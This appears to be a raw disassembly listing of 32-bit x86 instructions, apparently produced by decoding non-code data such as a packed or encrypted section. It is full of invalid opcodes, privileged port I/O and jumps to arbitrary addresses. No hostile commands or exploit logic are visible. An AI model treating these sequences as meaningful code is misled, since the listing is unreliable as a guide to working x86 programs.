  425f39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f3a:	and    ah,BYTE PTR fs:0xcce186e3
  425f41:	stos   BYTE PTR es:[edi],al
  425f42:	arpl   cx,bx
  425f44:	mov    edi,0xc1f4b934
  425f49:	aad    0x9b
  425f4b:	jg     0x425f77
  425f4d:	mov    ebp,0xe841b3e0
  425f52:	dec    eax
  425f53:	mov    ebp,0x6265896a
  425f58:	jo     0x425f0a
  425f5a:	or     ebp,edx
  425f5c:	leave  
  425f5d:	les    esi,FWORD PTR [ebx+0x57]
  425f60:	pop    esp
  425f61:	mov    WORD PTR [esi+0x255b129f],?
  425f67:	mov    dh,0x32
  425f69:	mov    edi,0xef5a733d
  425f6e:	cmp    DWORD PTR [esi+0x183fddca],edi
  425f74:	xor    al,0xf2
  425f76:	push   ecx
  425f77:	imul   ecx,DWORD PTR [ebx],0xc834c004
  425f7d:	mov    edi,0xfabc5802
  425f82:	pushf  
  425f83:	dec    esi
  425f84:	sbb    al,0xcf
  425f86:	jnp    0x425f09
  425f88:	fcom   QWORD PTR [eax-0x38]
  425f8b:	in     eax,0x6c
  425f8d:	enter  0x6952,0xa
  425f91:	and    edi,DWORD PTR [ebx-0x52393919]
  425f97:	add    BYTE PTR [ebp+0x7aaf0219],dl
  425f9d:	or     eax,0xe0c1395b
  425fa2:	mov    ebp,0x7001af28
  425fa7:	push   cs
  425fa8:	jmp    0x72dd:0xe2a713f8
  425faf:	jmp    FWORD PTR [bp+0x4dc3]
  425fb4:	aas    
  425fb5:	cmp    cl,BYTE PTR [ecx-0xd]
  425fb8:	mov    bl,0xa7
  425fba:	shl    DWORD PTR [ecx-0x4],0x1a
  425fbe:	aas    
  425fbf:	pop    ds
  425fc0:	test   DWORD PTR [ebp-0x40d7373a],esi
  425fc6:	dec    eax
  425fc7:	sti    
  425fc8:	dec    ebx
  425fc9:	lea    eax,[ebx+ecx*4+0x693255bc]
  425fd0:	cwde   
  425fd1:	xor    edx,ebx
  425fd3:	shr    BYTE PTR [ebx+0x19],0x5b
  425fd7:	shl    DWORD PTR [eax-0xd],0xf4
  425fdb:	pop    esp
  425fdc:	repz mov ecx,0xb6bacd5e
  425fe2:	idiv   DWORD PTR [ebx-0x3fe86604]
  425fe8:	push   ebx
  425fe9:	adc    al,0xce
  425feb:	pop    eax
  425fec:	(bad)  
  425fee:	push   esi
  425fef:	mov    eax,ds:0x59e66f77
  425ff4:	pop    es
  425ff5:	inc    eax
  425ff6:	cs repz or dl,ch
  425ffa:	inc    edi
  425ffb:	adc    ebx,DWORD PTR [ebx]
  425ffd:	jne    0x425fe5
  425fff:	icebp  
  426000:	ret    
  426001:	(bad)  
  426002:	push   esi
  426003:	sar    BYTE PTR [ebp+0x7a8574ee],0xd4
  42600a:	stos   DWORD PTR es:[edi],eax
  42600b:	cmp    DWORD PTR [edi-0x62],edi
  42600e:	xchg   edx,eax
  42600f:	adc    al,0xc
  426011:	sbb    al,0x9c
  426013:	or     al,0xc6
  426015:	addr16 repnz out 0x8f,eax
  426019:	sub    dh,BYTE PTR [ebx+0x4d2ff947]
  42601f:	daa    
  426020:	mov    dl,0xc8
  426022:	into   
  426023:	push   cs
  426024:	xchg   ebp,eax
  426025:	int    0x1e
  426027:	test   bh,al
  426029:	dec    edx
  42602a:	or     ebp,0x9214c526
  426030:	lahf   
  426031:	pop    ss
  426032:	stos   BYTE PTR es:[edi],al
  426033:	rcl    DWORD PTR ds:0x289830f4,0xa3
  42603a:	mov    eax,ds:0xd91bff71
  42603f:	into   
  426040:	out    0x79,eax
  426042:	push   0xfdb0c63a
  426047:	mov    bl,0x5a
  426049:	push   ebx
  42604a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42604b:	or     eax,0xf4a1115f
  426050:	pop    esp
  426051:	jp     0x4260ad
  426053:	fsub   QWORD PTR [ecx+0x603c7409]
  426059:	pop    es
  42605a:	push   edx
  42605b:	inc    ecx
  42605c:	jmp    0xb9517bb7
  426061:	sar    BYTE PTR [ebx+0x42],1
  426064:	arpl   WORD PTR [eax],sp
  426066:	call   DWORD PTR [edi]
  426068:	jmp    0xb864:0xed5041ef
  42606f:	popf   
  426070:	push   eax
  426071:	mov    ds:0xe48aa180,al
  426076:	sub    dl,bh
  426078:	test   al,0xf
  42607a:	mov    ebp,0x8dfabdb0
  42607f:	mov    ah,0x0
  426081:	mov    eax,esp
  426083:	rcr    DWORD PTR [eax+eiz*8+0x67],0xcc
  426088:	dec    BYTE PTR [ebx-0x7c]
  42608b:	add    edx,DWORD PTR [ebp+0x76]
  42608e:	push   cs
  42608f:	pop    ds
  426090:	icebp  
  426091:	lock int3 
  426093:	scas   eax,DWORD PTR es:[edi]
  426094:	cmp    ecx,esp
  426096:	fs sti 
  426098:	jns    0x426076
  42609a:	dec    ebp
  42609b:	inc    edi
  42609c:	add    BYTE PTR [ecx-0x3],dl
  42609f:	shl    DWORD PTR [ecx-0x20],cl
  4260a2:	adc    ebx,DWORD PTR [ebp-0x46]
  4260a5:	jmp    0x426108
  4260a7:	dec    ebx
  4260a8:	and    eax,0x5b1ed44b
  4260ad:	imul   ebx,DWORD PTR [edi],0xd
  4260b0:	pop    ss
  4260b1:	jp     0x426107
  4260b3:	les    ebx,FWORD PTR [eax]
  4260b5:	movq   mm4,QWORD PTR [edi-0x6db36b76]
  4260bc:	outs   dx,BYTE PTR ds:[esi]
  4260bd:	(bad)  
  4260bf:	push   eax
  4260c0:	dec    ebp
  4260c1:	loope  0x4260a7
  4260c3:	dec    ecx
  4260c4:	mov    ebp,0xd8fd8ea2
  4260c9:	(bad)  
  4260ca:	retf   0x28a2
  4260cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260ce:	and    DWORD PTR [ebx+0x9],ebx
  4260d1:	pop    ebx
  4260d2:	mov    bh,0xfc
  4260d4:	push   esi
  4260d5:	scas   al,BYTE PTR es:[edi]
  4260d6:	mov    edx,0x1c411a7f
  4260db:	in     al,dx
  4260dc:	into   
  4260dd:	mov    ecx,0xf91535be
  4260e2:	mov    edi,0x2178a7a0
  4260e7:	inc    edx
  4260e8:	sbb    edx,ecx
  4260ea:	push   0x3e602c9e
  4260ef:	lahf   
  4260f0:	mov    al,0x37
  4260f2:	inc    ecx
  4260f3:	cmp    esp,edi
  4260f5:	mov    edx,0xe0731d2d
  4260fa:	mov    bl,0x9a
  4260fc:	push   eax
  4260fd:	arpl   dx,bx
  4260ff:	ds stos BYTE PTR es:[edi],al
  426101:	imul   esp,DWORD PTR [edi],0x77
  426104:	sahf   
  426105:	push   edi
  426106:	pop    ss
  426107:	aaa    
  426108:	xor    eax,0x7ffb7e04
  42610d:	int3   
  42610e:	rsqrtps xmm6,XMMWORD PTR [eax+0x5cd86e07]
  426115:	jmp    0x1c271285
  42611a:	sub    dh,BYTE PTR [ebx+0x24392e37]
  426120:	cmp    DWORD PTR [edx+0x4f44fb1],esi
  426126:	iret   
  426127:	pop    ebx
  426128:	jbe    0x42618d
  42612a:	jbe    0x4260e7
  42612c:	hlt    
  42612d:	fcomp  DWORD PTR [esi+0x45]
  426130:	in     eax,dx
  426131:	ds mov dl,0xd6
  426134:	pop    ecx
  426135:	adc    eax,DWORD PTR [ebp-0x690a8df6]
  42613b:	push   0xffffffb3
  42613d:	push   0xd2fc3e9d
  426142:	and    ah,ah
  426144:	push   esi
  426145:	xchg   esi,eax
  426146:	retf   
  426147:	adc    DWORD PTR [eax+ebx*8-0x7e],edx
  42614b:	cmp    edi,DWORD PTR [ebx+0x65]
  42614e:	repz and BYTE PTR [ebx],al
  426151:	adc    esi,DWORD PTR [ebx+edi*8]
  426154:	test   DWORD PTR [esi+0x7b],0x9b8124f2
  42615b:	ds pop ecx
  42615d:	xor    ebp,DWORD PTR [ebx]
  42615f:	lods   al,BYTE PTR ds:[esi]
  426160:	outs   dx,BYTE PTR ds:[esi]
  426161:	gs stos DWORD PTR es:[edi],eax
  426163:	xchg   BYTE PTR [esi],dh
  426165:	call   0x1b9665a8
  42616a:	jge    0x4261dd
  42616c:	outs   dx,BYTE PTR ds:[esi]
  42616d:	push   esp
  42616e:	cmp    eax,0x312e8a97
  426173:	xor    dl,ah
  426175:	ss jl  0x4261e6
  426178:	jae    0x426142
  42617a:	adc    ch,BYTE PTR [eax-0xc]
  42617d:	dec    eax
  42617e:	idiv   DWORD PTR [ecx-0x28bc5d5f]
  426184:	enter  0xc0f1,0xc6
  426188:	jecxz  0x4261d1
  42618a:	cmp    edx,edi
  42618c:	cmc    
  42618d:	adc    BYTE PTR [ecx],0x3d
  426190:	mov    ch,0x5b
  426192:	pop    esp
  426193:	repz inc ebx
  426195:	pop    DWORD PTR [esi+0x445e9a94]
  42619b:	adc    al,0x61
  42619d:	stc    
  42619e:	imul   edi,edx,0xbf7d17c2
  4261a4:	out    dx,eax
  4261a5:	sbb    cl,0xb8
  4261a8:	stos   DWORD PTR es:[edi],eax
  4261a9:	mov    al,ds:0xebdc396e
  4261ae:	fmul   DWORD PTR ds:[eax]
  4261b1:	shl    BYTE PTR [edi-0x4],1
  4261b4:	mov    bl,0xf3
  4261b6:	popf   
  4261b7:	fs cli 
  4261b9:	jne    0x4261ed
  4261bb:	mov    cl,0x6
  4261bd:	sbb    al,0x45
  4261bf:	(bad)
  4261c2:	in     eax,dx
  4261c3:	call   0xdf8a3a1c
  4261c8:	add    bl,BYTE PTR [ecx]
  4261ca:	mov    esp,0x1b081ad9
  4261cf:	or     ebp,ebp
  4261d1:	cld    
  4261d2:	imul   esp,DWORD PTR [eax+0x62f098fa],0xfc9634bb
  4261dc:	jl     0x42624c
  4261de:	sub    ebx,esp
  4261e0:	out    0x22,al
  4261e2:	cmp    eax,0xe677e7af
  4261e7:	sbb    eax,0x8b089c41
  4261ec:	jl     0x4261de
  4261ee:	shl    ecx,cl
  4261f0:	cmp    edx,0x733eb214
  4261f6:	add    al,0x21
  4261f8:	inc    ebx
  4261f9:	lock and al,0xa4
  4261fc:	loope  0x4261a7
  4261fe:	loopne 0x426233
  426200:	shl    BYTE PTR [ecx+ebp*8],0x8b
  426204:	dec    esi
  426205:	sbb    al,0x64
  426207:	int3   
  426208:	jge    0x42619d
  42620a:	push   ebp
  42620b:	sbb    dh,BYTE PTR [esi+0x2e]
  42620e:	jmp    0x426193
  426210:	cmc    
  426211:	popa   
  426212:	add    dh,0xf4
  426215:	mov    ecx,0xf0dacf6b
  42621a:	bound  eax,QWORD PTR [eax+0xbd95c4b]
  426220:	iret   
  426221:	loop   0x426255
  426223:	add    edi,DWORD PTR [edi+0x243b2e34]
  426229:	push   0x7d
  42622b:	xor    BYTE PTR [ecx],bh
  42622d:	mov    ch,0x24
  42622f:	arpl   WORD PTR [esp+edx*2-0x6f2f766c],di
  426236:	arpl   WORD PTR [ebx-0x629529b6],cx
  42623c:	repnz add al,0xc3
  42623f:	push   es
  426240:	popf   
  426241:	dec    ebx
  426242:	xor    al,0x0
  426244:	js     0x426257
  426246:	jo     0x426209
  426248:	or     DWORD PTR [edi],0x22
  42624b:	icebp  
  42624c:	dec    ebp
  42624d:	int3   
  42624e:	adc    BYTE PTR [eax-0x5fc07259],bl
  426254:	imul   eax,DWORD PTR [ebp-0x28],0x5a
  426258:	mov    al,0xa3
  42625a:	mov    esi,0x79e729aa
  42625f:	inc    eax
  426260:	sub    ch,BYTE PTR [edx-0x7e]
  426263:	mov    eax,0xaf63fa17
  426268:	lds    ecx,FWORD PTR [ebp+0x53]
  42626b:	mov    dl,0x55
  42626d:	loop   0x4261f5
  42626f:	in     al,0x1e
  426271:	cmp    al,0xd4
  426273:	xchg   edi,eax
  426274:	mov    dl,0x6d
  426276:	dec    edx
  426277:	ret    0x6afb
  42627a:	mov    ebx,0x1ca402f5
  42627f:	(bad)  
  426280:	jp     0x426268
  426282:	pop    ecx
  426283:	dec    edx
  426284:	sub    al,0x37
  426286:	popf   
  426287:	ret    0xf26d
  42628a:	icebp  
  42628b:	shl    BYTE PTR [edx],1
  42628d:	push   ebp
  42628e:	fwait
  42628f:	and    al,dl
  426291:	lods   al,BYTE PTR ds:[esi]
  426292:	mov    al,ds:0x89f1479b
  426297:	sub    bl,BYTE PTR [ecx-0x526e7d3f]
  42629d:	shr    DWORD PTR [edi],cl
  42629f:	test   eax,0x661dff0b
  4262a4:	xor    esp,edx
  4262a6:	add    BYTE PTR [ebx+0xa],bl
  4262a9:	mov    ebx,0x44a45b04
  4262ae:	push   0x66
  4262b0:	fist   WORD PTR [eax-0x6]
  4262b3:	unpckhps xmm5,XMMWORD PTR [ebp+0x3618f508]
  4262ba:	cmp    BYTE PTR [edx+0x37948398],al
  4262c0:	ficomp WORD PTR [edx]
  4262c2:	into   
  4262c3:	ret    
  4262c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262c5:	lds    eax,FWORD PTR [eax-0xe035976]
  4262cb:	lahf   
  4262cc:	(bad)  
  4262cd:	aad    0xa1
  4262cf:	ss pop eax
  4262d1:	enter  0x2ea4,0x3
  4262d5:	sar    bh,1
  4262d7:	sahf   
  4262d8:	jbe    0x426261
  4262da:	jmp    0x783e:0x81994e1d
  4262e1:	icebp  
  4262e2:	mov    ebx,0x136b736a
  4262e7:	inc    edx
  4262e8:	inc    eax
  4262e9:	jp     0x426365
  4262eb:	scas   al,BYTE PTR es:[edi]
  4262ec:	push   0xe7de2053
  4262f1:	xor    dh,bl
  4262f3:	icebp  
  4262f4:	cmp    BYTE PTR [edi-0x7f],0xbf
  4262f8:	xchg   ebp,eax
  4262f9:	xchg   edi,eax
  4262fa:	shl    bl,1
  4262fc:	inc    ebx
  4262fd:	jae    0x4262fc
  4262ff:	xchg   edi,eax
  426300:	in     eax,dx
  426301:	scas   eax,DWORD PTR es:[edi]
  426302:	(bad)  
  426304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426306:	popa   
  426307:	adc    eax,0x64d40f6d
  42630c:	mov    al,0x85
  42630e:	bound  ebx,QWORD PTR [esi-0x603ea0ca]
  426314:	mov    eax,ds:0x80ced67c
  426319:	enter  0x5e2d,0x21
  42631d:	pop    es
  42631e:	mov    bh,0x35
  426320:	cdq    
  426321:	xor    DWORD PTR [edx+0x7c1c7e57],esi
  426327:	jbe    0x426345
  426329:	inc    edi
  42632a:	inc    edx
  42632b:	pusha  
  42632c:	repnz cdq 
  42632e:	dec    ecx
  42632f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426330:	or     DWORD PTR [ecx],0x41
  426333:	jp     0x426393
  426335:	in     eax,0xc2
  426337:	or     edx,ebp
  426339:	pop    edx
  42633a:	add    DWORD PTR [edx-0x549caa5e],edi
  426340:	shl    DWORD PTR [eax+0x46],1
  426343:	jmp    0xd1de:0x7124073b
  42634a:	jmp    0x426384
  42634c:	ds pop es
  42634e:	sbb    dl,bh
  426350:	push   esp
  426351:	xchg   ebx,eax
  426352:	sub    DWORD PTR [eax+0x4d],0x6f
  426356:	retf   
  426357:	and    al,0x19
  426359:	jne    0x426381
  42635b:	sahf   
  42635c:	data16 mov bl,0x52
  42635f:	jp     0x4263c0
  426361:	ret    0xff9
  426364:	jl     0x426342
  426366:	push   esi
  426367:	jb     0x426301
  426369:	imul   edx,edi,0x61a0a3ec
  42636f:	or     eax,0x4fde7138
  426374:	jle    0x4263f4
  426376:	push   ecx
  426377:	mov    edx,0x85264991
  42637c:	push   esp
  42637d:	dec    esp
  42637e:	mov    ebp,0x904661d
  426383:	mov    ebp,edi
  426385:	adc    al,0x3e
  426387:	std    
  426388:	mov    ebp,0xd2fbb81
  42638d:	sbb    BYTE PTR [edi],bl
  42638f:	cli    
  426390:	xor    ch,bl
  426392:	or     dh,ch
  426394:	pop    esi
  426395:	ret    0xe2d0
  426398:	arpl   bx,bp
  42639a:	(bad)  
  42639b:	or     cl,BYTE PTR [ebx+0x41723593]
  4263a1:	test   eax,0xf1273475
  4263a6:	inc    dh
  4263a8:	dec    ecx
  4263a9:	mov    dl,0xa2
  4263ab:	lods   al,BYTE PTR ds:[esi]
  4263ac:	mov    ecx,0x45ca6fe9
  4263b1:	sub    al,0x6e
  4263b3:	out    dx,eax
  4263b4:	stos   DWORD PTR es:[edi],eax
  4263b5:	fistp  DWORD PTR [ebp+0x70]
  4263b8:	inc    edi
  4263b9:	add    edi,DWORD PTR [eax]
  4263bb:	sbb    ebx,DWORD PTR [edx-0x4c]
  4263be:	fnstcw WORD PTR [ecx-0x167a4bec]
  4263c4:	lahf   
  4263c5:	mov    bl,dh
  4263c7:	and    edx,DWORD PTR [eax+0x3e]
  4263ca:	test   dh,ch
  4263cc:	hlt    
  4263cd:	test   BYTE PTR [eax+ecx*8-0x34432aa5],0x1a
  4263d5:	mov    esp,0xaa789c50
  4263da:	add    eax,0x5390c61
  4263df:	or     ebp,DWORD PTR [edi-0x2c9b8d49]
  4263e5:	adc    BYTE PTR [edx-0x20],cl
  4263e8:	jmp    0x4263e7
  4263ea:	jb     0x426445
  4263ec:	dec    esp
  4263ed:	ins    BYTE PTR es:[edi],dx
  4263ee:	fwait
  4263ef:	adc    al,0x47
  4263f1:	and    ch,BYTE PTR [esi+0x74]
  4263f4:	sub    edx,DWORD PTR [edi]
  4263f6:	mov    dh,al
  4263f8:	fbld   TBYTE PTR [eax-0x480af105]
  4263fe:	lahf   
  4263ff:	(bad)  
  426400:	outs   dx,BYTE PTR ds:[esi]
  426401:	and    DWORD PTR [edx],edi
  426403:	sti    
  426404:	fimul  WORD PTR [ecx-0x360a3d5e]
  42640a:	(bad)  
  42640b:	xor    al,0x93
  42640d:	adc    ebx,DWORD PTR [esi-0x191c7629]
  426413:	inc    edi
  426414:	enter  0xd026,0x8c
  426418:	jmp    0x9c6dd8d5
  42641d:	data16 in al,0xd6
  426420:	aad    0x4b
  426422:	xlat   BYTE PTR ds:[ebx]
  426423:	sub    DWORD PTR [esi+0x7b2ffd6e],ebx
  426429:	call   0xd566:0xe47b9f16
  426430:	leave  
  426431:	mov    edx,DWORD PTR [eax+0x25]
  426434:	cdq    
  426435:	pop    es
  426436:	mov    al,0x81
  426438:	inc    ebx
  426439:	inc    ebx
  42643a:	jmp    0x21953e01
  42643f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426440:	push   ss
  426441:	xor    DWORD PTR [ebp+0x17d3efa2],ebx
  426447:	jmp    0xfa4f37d4
  42644c:	je     0x42644a
  42644e:	push   0x73
  426450:	out    dx,al
  426451:	call   0x858e:0xeb788768
  426458:	cmp    DWORD PTR [edx-0xd4297d3],esi
  42645e:	mov    cl,0x41
  426460:	mov    WORD PTR [ecx-0x5],ss
  426463:	pop    eax
  426464:	mov    WORD PTR [esi+edx*8],ss
  426467:	add    esp,esi
  426469:	in     eax,0x78
  42646b:	dec    edi
  42646c:	sbb    DWORD PTR [ecx+0x13],0x6b
  426470:	ror    DWORD PTR [ebx+0x30],0xb4
  426474:	aad    0xe
  426476:	mov    DWORD PTR [esi+edx*1-0x61],edi
  42647a:	pop    ebx
  42647b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42647c:	pushf  
  42647d:	ja     0x4264a9
  42647f:	hlt    
  426480:	call   0xcebf:0x9a842a8b
  426487:	ja     0x426458
  426489:	ret    
  42648a:	xchg   ebx,eax
  42648b:	jbe    0x4264f4
  42648d:	and    edi,DWORD PTR [eax+0x4f]
  426490:	fs jle 0x4264f8
  426493:	jb     0x426417
  426495:	mov    esi,0x4fab
	...
  426512:	add    BYTE PTR [eax],al
  426514:	mov    edi,0xed95a576
  426519:	xlat   BYTE PTR ds:[ebx]
  42651a:	mov    edi,0xa0a36c7e
  42651f:	rcr    BYTE PTR [ebx],0x1c
  426522:	outs   dx,BYTE PTR ds:[esi]
  426523:	(bad)  
  426525:	test   BYTE PTR [ecx],0x0
  426528:	ins    BYTE PTR es:[edi],dx
  426529:	pop    es
  42652a:	add    BYTE PTR [eax],al
  42652c:	xchg   ecx,eax
  42652d:	addr16 push eax
  42652f:	outs   dx,BYTE PTR ds:[esi]
  426530:	imul   esp,DWORD PTR [bp+di+0x1],0x8550ec72
  426538:	inc    ecx
  426539:	leave  
  42653a:	dec    edx
  42653b:	ja     0x4264c2
  42653d:	imul   eax,DWORD PTR [esi],0xccbe469
  426543:	ret    0x5df6
  426546:	out    dx,al
  426547:	mov    ds:0x810b800a,al
  42654c:	das    
  42654d:	ja     0x4265ca
  42654f:	fisub  DWORD PTR [edi]
  426551:	add    DWORD PTR [ecx+0x74a6e201],0xc6cc512f
  42655b:	(bad)  
  42655d:	icebp  
  42655e:	gs push 0xffffff8c
  426561:	xor    cl,BYTE PTR [esi+0x2a57e09b]
  426567:	into   
  426568:	(bad)  
  42656a:	push   edi
  42656b:	cs mov edx,0xb78a3f99
  426571:	inc    edi
  426572:	neg    DWORD PTR [eax]
  426574:	call   0xf24d:0x5f374622
  42657b:	xchg   esp,eax
  42657c:	mov    eax,ds:0xed1f6ec2
  426581:	sub    esp,DWORD PTR [ebx+0x27]
  426584:	shl    ecx,cl
  426586:	inc    eax
  426587:	or     eax,0x476f1f8b
  42658c:	mov    ch,0x35
  42658e:	sub    al,0x31
  426590:	and    DWORD PTR [eax+0x6e],edx
  426593:	push   cs
  426594:	out    dx,al
  426595:	test   BYTE PTR [edx],cl
  426597:	xchg   edi,eax
  426598:	sub    eax,eax
  42659a:	stos   DWORD PTR es:[edi],eax
  42659b:	mov    bh,0xb8
  42659d:	and    BYTE PTR [eax],ch
  42659f:	or     DWORD PTR [eax],0xd747e137
  4265a5:	in     al,0x57
  4265a7:	stos   BYTE PTR es:[edi],al
  4265a8:	xchg   edx,eax
  4265a9:	mov    WORD PTR [edi+0x2],ss
  4265ac:	pop    eax
  4265ad:	(bad)  
  4265ae:	lea    ebx,[eax+0x314182f]
  4265b4:	(bad)  
  4265b5:	fisub  DWORD PTR [esi+0x27]
  4265b8:	jmp    0x426573
  4265ba:	pop    esp
  4265bb:	and    bl,BYTE PTR [ecx-0x253c9d63]
  4265c1:	shl    DWORD PTR [ebx],1
  4265c3:	shl    DWORD PTR [ebx-0x38],0xe9
  4265c7:	mov    ebp,ss
  4265c9:	mov    ds,ebx
  4265cb:	dec    esi
  4265cc:	jmp    0x291fcc92
  4265d1:	lock ja 0x42662b
  4265d4:	or     ecx,DWORD PTR ds:0x2763eca8
  4265da:	pop    ecx
  4265db:	fs cmp eax,0x573aba16
  4265e1:	sbb    ebp,DWORD PTR [ebp-0x10]
  4265e4:	test   eax,0xebcc0699
  4265e9:	nop
  4265ea:	idiv   DWORD PTR [edi]
  4265ec:	and    dh,BYTE PTR [eax]
  4265ee:	cmp    eax,0x6c703b9c
  4265f3:	sahf   
  4265f4:	sbb    BYTE PTR [esi+0x7fae352d],ah
  4265fa:	sub    bh,dl
  4265fc:	adc    dl,cl
  4265fe:	(bad)  
  4265ff:	fs push 0x3e863bf9
  426605:	and    eax,DWORD PTR [ecx+0x78814a29]
  42660b:	les    ecx,FWORD PTR [edi]
  42660d:	aam    0x31
  42660f:	int    0x82
  426611:	stos   BYTE PTR es:[edi],al
  426612:	cmovno esi,DWORD PTR [ecx+edi*8]
  426616:	cmp    BYTE PTR [edi+0x179dfb41],0xa1
  42661d:	jb     0x426656
  42661f:	push   ebx
  426620:	popf   
  426621:	or     bh,ah
  426623:	das    
  426624:	mov    ds:0x59d1e0e6,al
  426629:	xchg   esp,eax
  42662a:	hlt    
  42662b:	push   cs
  42662c:	imul   ebx,DWORD PTR [eax+0x948d99a],0xffffffef
  426633:	aam    0x2a
  426635:	inc    eax
  426636:	dec    eax
  426637:	mov    ds:0x15bdb146,eax
  42663c:	or     edx,DWORD PTR [ebp+0x3a]
  42663f:	mov    dl,0xca
  426641:	mov    ebp,0x7c8f43f9
  426646:	jp     0x4266bd
  426648:	jo     0x426655
  42664a:	push   edi
  42664b:	adc    DWORD PTR [edx-0x52],ebx
  42664e:	xor    dl,BYTE PTR [ebx+esi*4]
  426651:	cmp    al,BYTE PTR [esi]
  426653:	xchg   DWORD PTR [ebx],ecx
  426655:	fisttp QWORD PTR gs:[ebp+eiz*2+0x1f9093c9]
  42665d:	icebp  
  42665e:	push   0x55eab4bc
  426663:	mov    ebp,0xbddb4e09
  426668:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426669:	add    DWORD PTR [edi-0x62af5109],esi
  42666f:	mov    DWORD PTR [esi+edx*2+0x76ffabd3],esp
  426676:	mov    esp,0xcdb32557
  42667b:	adc    DWORD PTR [esi+0x40],ebp
  42667e:	cmp    DWORD PTR [ebp-0x11],edi
  426681:	clc    
  426682:	shl    BYTE PTR [edi],1
  426684:	push   ebp
  426685:	repnz jecxz 0x426664
  426688:	pop    ds
  426689:	stos   DWORD PTR es:[edi],eax
  42668a:	imul   eax,DWORD PTR [esi],0x67
  42668d:	test   eax,0x4858fba0
  426692:	cwde   
  426693:	xor    eax,0xb0b406c
  426698:	popa   
  426699:	adc    al,0xc3
  42669b:	xchg   eax,ebp
  42669d:	stos   DWORD PTR es:[edi],eax
  42669e:	jl     0x4266a2
  4266a0:	out    0x4f,al
  4266a2:	enter  0x6e8a,0x85
  4266a6:	lods   eax,DWORD PTR ds:[esi]
  4266a7:	mov    esi,0x712ec9ab
  4266ac:	pushf  
  4266ad:	or     al,BYTE PTR [eax-0x6e04b43a]
  4266b3:	arpl   WORD PTR [ebx+0x127bb4b],sp
  4266b9:	push   eax
  4266ba:	mov    WORD PTR [edi+0x1aca762d],gs
  4266c0:	xor    al,0xe6
  4266c2:	push   ebx
  4266c3:	leave  
  4266c4:	test   DWORD PTR [ecx],eax
  4266c6:	ror    BYTE PTR [eax],0x49
  4266c9:	cdq    
  4266ca:	je     0x42671a
  4266cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266cd:	pop    edi
  4266ce:	or     ch,bh
  4266d0:	idiv   cl
  4266d2:	scas   al,BYTE PTR es:[edi]
  4266d3:	cmc    
  4266d4:	es pushf 
  4266d6:	pop    es
  4266d7:	or     edx,eax
  4266d9:	mov    ds:0x1058e438,eax
  4266de:	std    
  4266df:	shl    BYTE PTR [esi-0x4b230a2c],0x7f
  4266e6:	push   esi
  4266e7:	adc    edi,0x40
  4266ea:	lods   al,BYTE PTR ds:[esi]
  4266eb:	mov    dl,dl
  4266ed:	pop    edx
  4266ee:	rcr    BYTE PTR [edi+0x42f309c3],cl
  4266f4:	ret    
  4266f5:	popa   
  4266f6:	stos   BYTE PTR es:[edi],al
  4266f7:	loope  0x42667c
  4266f9:	test   BYTE PTR [ecx+esi*4+0x61965ad4],ah
  426700:	ret    0x68c5
  426703:	mov    bl,0x11
  426705:	pop    es
  426706:	or     bh,BYTE PTR [edi+0x6ca202f3]
  42670c:	mov    esi,0xe0ccf4e6
  426711:	loope  0x4266dd
  426713:	shr    BYTE PTR [eax+0x78],0x2a
  426717:	mov    eax,0x5b1a4769
  42671c:	gs inc esp
  42671e:	fsubr  DWORD PTR [ebx]
  426720:	add    al,0x5b
  426722:	push   es
  426723:	jns    0x426728
  426725:	pxor   mm3,QWORD PTR [edi+0x59e7dfef]
  42672c:	js     0x426791
  42672e:	mov    esi,0x451c81af
  426733:	ret    
  426734:	clc    
  426735:	stos   DWORD PTR es:[edi],eax
  426736:	sti    
  426737:	sub    eax,esp
  426739:	sahf   
  42673a:	pop    ds
  42673b:	ss jno 0x4266c5
  42673e:	popf   
  42673f:	scas   al,BYTE PTR es:[edi]
  426740:	aaa    
  426741:	imul   edi,DWORD PTR [ebx+ecx*4-0x30989b10],0xfffffff6
  426749:	jne    0x426721
  42674b:	loope  0x4267c6
  42674d:	dec    esi
  42674e:	gs mov edx,0xe85372a2
  426754:	dec    ecx
  426755:	push   ss
  426756:	imul   esi,DWORD PTR [eax+ebp*4-0x4c057a4e],0x31728ca9
  426761:	in     al,0x44
  426763:	and    BYTE PTR [edx-0x7c],0x5b
  426767:	pop    esi
  426768:	xor    DWORD PTR [esi-0x46fe5e47],edi
  42676e:	les    ebx,FWORD PTR ds:0x40c3a291
  426774:	call   0xeb05:0xc83987e4
  42677b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42677c:	adc    BYTE PTR [ebp+edx*8+0x780355c],bh
  426783:	es mov esi,0xf2483241
  426789:	int    0xc1
  42678b:	outs   dx,BYTE PTR ds:[esi]
  42678c:	xchg   esp,eax
  42678d:	outs   dx,DWORD PTR ds:[esi]
  42678e:	lock test eax,0x57b189f8
  426794:	retf   0x281f
  426797:	xchg   edx,eax
  426798:	xor    BYTE PTR [esi-0x1ca5141],cl
  42679e:	mov    ebx,DWORD PTR [esi]
  4267a0:	mov    edi,0x3b80705a
  4267a5:	in     al,dx
  4267a6:	mov    al,ds:0x7b3547fd
  4267ab:	and    ebp,DWORD PTR [ebp-0x227de94c]
  4267b1:	inc    edi
  4267b2:	pop    ds
  4267b3:	call   0x29900662
  4267b8:	retf   
  4267b9:	daa    
  4267ba:	test   al,0x98
  4267bc:	push   eax
  4267bd:	jmp    0xa55ce2f0
  4267c2:	cdq    
  4267c3:	or     BYTE PTR [ebp+0x42b7a315],ah
  4267c9:	test   al,0x34
  4267cb:	xor    dh,BYTE PTR [edi+0x45]
  4267ce:	jmp    0x254d80d6
  4267d3:	mov    eax,0x6dedf2c6
  4267d8:	ret    0xea19
  4267db:	stos   DWORD PTR es:[edi],eax
  4267dc:	pusha  
  4267dd:	or     al,dl
  4267df:	lds    esi,FWORD PTR [ebp-0x3a]
  4267e2:	sbb    ah,dl
  4267e4:	rol    BYTE PTR [edx],1
  4267e6:	inc    edx
  4267e7:	cmp    BYTE PTR [edi],bl
